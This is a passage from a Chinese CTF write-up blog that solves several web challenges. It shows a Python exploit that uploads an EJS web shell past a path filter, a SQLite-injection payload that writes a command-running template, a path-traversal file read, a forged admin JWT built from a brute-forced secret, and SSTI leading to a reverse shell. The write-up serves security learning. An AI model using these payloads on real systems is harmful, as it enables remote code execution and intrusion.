+<p>唯一的问题是绕过<code>if (/js$|\.\./i.test(req.path)) res.status(403).send(&#39;Denied filename&#39;)</code>，文件名不能以<code>.ejs</code>结尾</p>
+<p>这里使用<code>/views/shell.ejs/.</code>绕过，这样 <code>req.path</code> 以 <code>.</code> 结尾，不是 <code>js</code>，所以可以通过安全中间件。</p>
+<p>然后在上传处理程序中，<code>path.join</code> 的路径规范化特性标准化了路径，所以文件被创建为 <code>shell.ejs</code></p>
+<h4 id="这里就是python的BUG"><a href="#这里就是python的BUG" class="headerlink" title="这里就是python的BUG"></a>这里就是python的BUG</h4><p>下面是python的EXP</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">    url = <span class="string">&quot;http://45.40.247.139:31505&quot;</span></span><br><span class="line">    proxy = &#123;<span class="string">&quot;http&quot;</span>: <span class="string">&quot;http://127.0.0.1:8080&quot;</span>, <span class="string">&quot;https&quot;</span>: <span class="string">&quot;http://127.0.0.1:8080&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 恶意EJS内容：执行命令并输出结果</span></span><br><span class="line">    command = <span class="string">&quot;/readflag&quot;</span>  <span class="comment"># 根据实际情况调整命令</span></span><br><span class="line">    content = <span class="string">f&quot;&lt;%= process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;<span class="subst">&#123;command&#125;</span>&#x27;) %&gt;&quot;</span></span><br><span class="line">    content_b64 = base64.b64encode(content.encode()).decode()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 上传路径，使用&quot;/.&quot;绕过安全中间件检查</span></span><br><span class="line">    upload_path = <span class="string">&quot;/views/shell.ejs/.&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Uploading malicious EJS file to:&quot;</span>, url + upload_path)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 发送PUT请求上传文件</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Uploading malicious EJS file...&quot;</span>)</span><br><span class="line">    response = requests.put(url + upload_path, json=&#123;<span class="string">&quot;content&quot;</span>: content_b64&#125;, proxies=proxy)</span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">201</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Upload successful&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Upload failed:&quot;</span>, response.text)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 渲染模板以执行命令</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Rendering template to execute command...&quot;</span>)</span><br><span class="line">    render_url = url + <span class="string">&quot;/views/?templ=shell.ejs&quot;</span></span><br><span class="line">    response = requests.get(render_url)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Response:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    exploit()</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251012155803930.png"
+                      alt="image-20251012155803930"
+                ></p>
+<p><strong>可以看到这里上路径的末尾是有<code>·</code>的，但是BP抓包发现末尾的<code>.</code>没了！！！我还以为是方法错了。。。</strong></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251012160148723.png"
+                      alt="image-20251012160148723"
+                ></p>
+<h4 id="下次记住不要偷懒，手动添加"><a href="#下次记住不要偷懒，手动添加" class="headerlink" title="下次记住不要偷懒，手动添加"></a>下次记住不要偷懒，手动添加</h4><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251012160702978.png"
+                      alt="image-20251012160702978"
+                ></p>
+<p>访问<code>/?templ=shell</code>即可getshell，通过附件可知运行<code>/readflag</code>即可得到flag </p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="../images/image-20251012161712264.png"
+                      alt="image-20251012161712264" style="zoom:50%;" 
+                >
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251012161730366.png"
+                      alt="image-20251012161730366"
+                ></p>
+<h2 id="ezsignin"><a href="#ezsignin" class="headerlink" title="ezsignin"></a>ezsignin</h2><p>注册后登录</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="../images/image-20251012110618902.png"
+                      alt="image-20251012110618902" style="zoom: 67%;" 
+                >
+
+<p><code>connect.sid</code>是Nodejs的Express-session框架</p>
+<p>看WP才知道是Nodejs下的 <strong>Sqlite</strong> 注入，漏洞点在<code>/register</code>路由下</p>
+<p><code>/download/</code>路由可以任意文件读取</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://45.40.247.139:26942/download/?filename=../app.js</span><br></pre></td></tr></table></figure></div>
+
+<p>在&#x2F;upload处渲染了ejs模板，但是upload.ejs并不存在</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="../images/image-20251017182151180.png"
+                      alt="image-20251017182151180" style="zoom: 67%;" 
+                >
+
+<p>报错中获得了模板目录的绝对路径，通过sqlite注入写模板进去即可</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="../images/image-20251017182245331.png"
+                      alt="image-20251017182245331" style="zoom:67%;" 
+                >
+
+<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p><strong>闭合SQL语句，通过<code>ATTACH DATABASE</code>在<code>/views/</code>目录创建<code>.ejs</code>模板文件，在<code>.ejs</code>模板文件中插入可执行的Node.js代码，访问触发渲染即可RCE</strong></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&#x27;,&#x27;114514&#x27;);ATTACH DATABASE &#x27;views/upload.ejs&#x27; AS shell;create TABLE shell.exp (payload text); insert INTO shell.exp (payload) VALUES (&#x27;&lt;%= process.mainModule.require(&quot;child_process&quot;).execSync(&quot;cat /fla4444444aaaaaagg.txt&quot;) %&gt;&#x27;);--&amp;password=123456&amp;confirmPassword=123456</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251015165547351.png"
+                      alt="image-20251015165547351"
+                ></p>
+<h2 id="evil-login"><a href="#evil-login" class="headerlink" title="evil_login"></a>evil_login</h2><p>弱密码guest&#x2F;guest1234</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="../images/image-20251011215150455.png"
+                      alt="image-20251011215150455" style="zoom: 67%;" 
+                >
+
+<p>发现 JWT Token</p>
+<h3 id="插一句"><a href="#插一句" class="headerlink" title="插一句"></a>插一句</h3><p><strong>通过这题提醒我  <code>JWT</code> 和 <code>flask session</code> 的区别</strong></p>
+<p><strong>JWT和flask session长得很像，导致时常分不清它们的区别</strong></p>
+<p><strong>区别也很简单</strong></p>
+<p><strong>很蠢但是有用的办法，通过在线网站<code>https://www.jwt.io/</code>或者本地工具<code>JWT_GUI</code>对cookie进行解密，如果不乱码就是<code>JWT</code>，有乱码就是<code>flask session</code></strong></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251011225927264.png"
+                      alt="image-20251011225927264"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251011225941061.png"
+                      alt="image-20251011225941061"
+                ></p>
+<p>没有乱码说明是<code>JWT</code>，通过工具爆破出密钥是<code>admin123</code></p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="../images/image-20251015153924845.png"
+                      alt="image-20251015153924845" style="zoom:67%;" 
+                >
+
+<p>直接伪造admin</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.-M2fBkjjUddPWmGOAcZ9tDfpZBnCWlfrvIkaOQifNYk</span><br></pre></td></tr></table></figure></div>
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="../images/image-20251015154656610.png"
+                      alt="image-20251015154656610" style="zoom:67%;" 
+                >
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="../images/image-20251015154617470.png"
+                      alt="image-20251015154617470" style="zoom:67%;" 
+                >
+
+<p>404页面用户名可以ssti，即通过得到的secret_key伪造用户名进行SSTI，先读取源码，发现SSTI无任何过滤</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> (</span><br><span class="line">    Flask,</span><br><span class="line">    render_template,</span><br><span class="line">    request,</span><br><span class="line">    redirect,</span><br><span class="line">    url_for,</span><br><span class="line">    flash,</span><br><span class="line">    render_template_string</span><br><span class="line">)</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime, timedelta</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化 Flask 应用</span></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="comment"># 从环境变量获取密钥，默认使用开发环境密钥（生产环境需替换）</span></span><br><span class="line">app.secret_key = os.environ.get(<span class="string">&quot;FLASK_SECRET&quot;</span>, <span class="string">&quot;dev_secret_key_change_me&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 模拟用户数据库（实际项目应使用数据库存储）</span></span><br><span class="line">USERS = &#123;</span><br><span class="line">    <span class="string">&quot;admin&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: <span class="string">&quot;admin6666&quot;</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Admin User&quot;</span>,</span><br><span class="line">        <span class="string">&quot;email&quot;</span>: <span class="string">&quot;admin@example.com&quot;</span>,</span><br><span class="line">        <span class="string">&quot;bio&quot;</span>: <span class="string">&quot;我是站点管理员。&quot;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;guest&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: <span class="string">&quot;guest1234&quot;</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Guest User&quot;</span>,</span><br><span class="line">        <span class="string">&quot;email&quot;</span>: <span class="string">&quot;guest@example.com&quot;</span>,</span><br><span class="line">        <span class="string">&quot;bio&quot;</span>: <span class="string">&quot;我是访客用户。&quot;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># JWT 配置常量（生产环境需通过环境变量注入，避免硬编码）</span></span><br><span class="line">JWT_SECRET = <span class="string">&quot;admin123&quot;</span></span><br><span class="line">JWT_ALGORITHM = <span class="string">&quot;HS256&quot;</span></span><br><span class="line">JWT_EXP_DELTA_SECONDS = <span class="number">60</span> * <span class="number">60</span>  <span class="comment"># Token 有效期：1小时</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_token</span>(<span class="params">username: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;生成 JWT Token（包含用户名信息）&quot;&quot;&quot;</span></span><br><span class="line">    payload = &#123;</span><br><span class="line">        <span class="string">&quot;user&quot;</span>: username</span><br><span class="line">        <span class="comment"># 注：原代码未添加过期时间，建议补充：&quot;exp&quot;: datetime.utcnow() + timedelta(seconds=JWT_EXP_DELTA_SECONDS)</span></span><br><span class="line">    &#125;</span><br><span class="line">    token = jwt.encode(payload, JWT_SECRET, algorithm=JWT_ALGORITHM)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 兼容 jwt 库不同版本的返回类型（bytes 转 str）</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(token, <span class="built_in">bytes</span>):</span><br><span class="line">        token = token.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> token</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_token</span>(<span class="params">token: <span class="built_in">str</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;解码 JWT Token，失败返回 None&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 若添加了过期时间，需在 decode 时处理过期异常（可细化 except 类型）</span></span><br><span class="line">        payload = jwt.decode(token, JWT_SECRET, algorithms=[JWT_ALGORITHM])</span><br><span class="line">        <span class="keyword">return</span> payload</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_current_user</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;从 Cookie 中获取 Token 并解析当前登录用户&quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 从请求 Cookie 中提取认证 Token</span></span><br><span class="line">    token = request.cookies.get(<span class="string">&quot;auth_token&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> token:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解码 Token 并获取用户名</span></span><br><span class="line">    payload = decode_token(token)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> payload:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;登录页面：处理登录请求或跳转已登录用户到个人主页&quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 若已登录，直接跳转个人主页</span></span><br><span class="line">    <span class="keyword">if</span> get_current_user():</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;profile&quot;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 处理 POST 登录请求</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        <span class="comment"># 提取并清洗表单数据</span></span><br><span class="line">        username = request.form.get(<span class="string">&quot;username&quot;</span>, <span class="string">&quot;&quot;</span>).strip()</span><br><span class="line">        password = request.form.get(<span class="string">&quot;password&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 验证用户是否存在及密码是否正确</span></span><br><span class="line">        user = USERS.get(username)</span><br><span class="line">        <span class="keyword">if</span> user <span class="keyword">and</span> user[<span class="string">&quot;password&quot;</span>] == password:</span><br><span class="line">            <span class="comment"># 生成 Token 并设置到 Cookie</span></span><br><span class="line">            token = generate_token(username)</span><br><span class="line">            resp = redirect(url_for(<span class="string">&quot;profile&quot;</span>))</span><br><span class="line">            resp.set_cookie(</span><br><span class="line">                <span class="string">&quot;auth_token&quot;</span>,</span><br><span class="line">                token,</span><br><span class="line">                httponly=<span class="literal">True</span>,  <span class="comment"># 防止 JS 读取，降低 XSS 风险</span></span><br><span class="line">                samesite=<span class="string">&quot;Lax&quot;</span>,  <span class="comment"># 限制跨站请求携带 Cookie</span></span><br><span class="line">                secure=<span class="literal">False</span>,  <span class="comment"># 生产环境需设为 True（仅 HTTPS 传输）</span></span><br><span class="line">                max_age=JWT_EXP_DELTA_SECONDS,  <span class="comment"># Cookie 有效期与 Token 一致</span></span><br><span class="line">            )</span><br><span class="line">            flash(<span class="string">&quot;登录成功&quot;</span>, <span class="string">&quot;success&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> resp</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flash(<span class="string">&quot;用户名或密码错误&quot;</span>, <span class="string">&quot;danger&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># GET 请求：返回登录页面</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;login.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.context_processor</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inject_user</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;全局模板上下文：注入当前登录用户（所有模板可直接使用 current_user）&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&quot;current_user&quot;</span>: get_current_user()&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/profile&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">profile</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;个人主页：仅登录用户可访问&quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 验证是否登录，未登录则跳转登录页</span></span><br><span class="line">    username = get_current_user()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> username:</span><br><span class="line">        flash(<span class="string">&quot;请先登录&quot;</span>, <span class="string">&quot;warning&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;login&quot;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取用户详情并渲染个人主页</span></span><br><span class="line">    user = USERS.get(username, &#123;&#125;)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;profile.html&quot;</span>, username=username, user=user)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/logout&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;退出登录：清除认证 Cookie 并跳转登录页&quot;&quot;&quot;</span></span><br><span class="line">    resp = redirect(url_for(<span class="string">&quot;login&quot;</span>))</span><br><span class="line">    resp.set_cookie(<span class="string">&quot;auth_token&quot;</span>, <span class="string">&quot;&quot;</span>, max_age=<span class="number">0</span>)  <span class="comment"># 设置 Cookie 立即过期</span></span><br><span class="line">    flash(<span class="string">&quot;已退出登录&quot;</span>, <span class="string">&quot;info&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">404</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">page_not_found</span>(<span class="params">e</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;404 页面：未登录用户跳转登录页，已登录用户渲染自定义 404&quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 未登录用户强制跳转登录</span></span><br><span class="line">    username = get_current_user()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> username:</span><br><span class="line">        flash(<span class="string">&quot;请先登录&quot;</span>, <span class="string">&quot;warning&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;login&quot;</span>))</span><br><span class="line"></span><br><span class="line">    template = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&#123;% extends &quot;base.html&quot; %&#125;</span></span><br><span class="line"><span class="string">&#123;% block content %&#125;</span></span><br><span class="line"><span class="string">  &lt;div class=&quot;center-content error card&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;h1&gt;Dear &#123;&#123; username &#125;&#125;,&lt;/h1&gt;</span></span><br><span class="line"><span class="string">    &lt;h3&gt;That page doesn&#x27;t exist.&lt;/h3&gt;</span></span><br><span class="line"><span class="string">  &lt;/div&gt;</span></span><br><span class="line"><span class="string">&#123;% endblock %&#125;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 传递 username 到模板（避免直接字符串格式化，符合 Jinja2 最佳实践）</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template, username=username), <span class="number">404</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;开发环境启动服务（生产环境需使用 Gunicorn 等 WSGI 服务器）&quot;&quot;&quot;</span></span><br><span class="line">    app.run(</span><br><span class="line">        host=<span class="string">&quot;0.0.0.0&quot;</span>,  <span class="comment"># 允许外部访问</span></span><br><span class="line">        port=<span class="number">5000</span>  <span class="comment"># 服务端口</span></span><br><span class="line">    )</span><br></pre></td></tr></table></figure></div>
+
+<p>读&#x2F;flag没权限，反弹shell</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="../images/image-20251015161051765.png"
+                      alt="image-20251015161051765" style="zoom:67%;" 
+                >
+
+<p>这里参考<a class="link"   target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/kM9qR1KD_sGlIOw5QTq8-Q" >https://mp.weixin.qq.com/s/kM9qR1KD_sGlIOw5QTq8-Q <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>查看进程发现mcp server为root权限，端口为9000</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251015161311863.png"
+                      alt="image-20251015161311863"
+                ></p>
+<p>写个python脚本在靶机上运行，列出mcp相关组件</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">from</span> fastmcp <span class="keyword">import</span> Client, FastMCP</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化 FastMCP HTTP 客户端（指定服务端地址）</span></span><br><span class="line">client = Client(<span class="string">&quot;http://127.0.0.1:9000/mcp&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># 异步上下文管理器：自动管理客户端连接（创建/关闭）</span></span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> client:</span><br><span class="line">        <span class="comment"># 1. 基础服务器连通性测试（发送 ping 请求）</span></span><br><span class="line">        <span class="keyword">await</span> client.ping()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 2. 获取服务端可用资源与操作列表</span></span><br><span class="line">        tools = <span class="keyword">await</span> client.list_tools()          <span class="comment"># 列出可用工具</span></span><br><span class="line">        resources = <span class="keyword">await</span> client.list_resources()  <span class="comment"># 列出可用资源</span></span><br><span class="line">        prompts = <span class="keyword">await</span> client.list_prompts()      <span class="comment"># 列出可用提示词</span></span><br><span class="line">        templates = <span class="keyword">await</span> client.list_resource_templates()  <span class="comment"># 列出资源模板</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 打印获取到的资源信息（统一缩进，便于阅读）</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;可用工具:&quot;</span>, tools)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;可用资源:&quot;</span>, resources)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;可用提示词:&quot;</span>, prompts)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;资源模板:&quot;</span>, templates)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动异步主函数</span></span><br><span 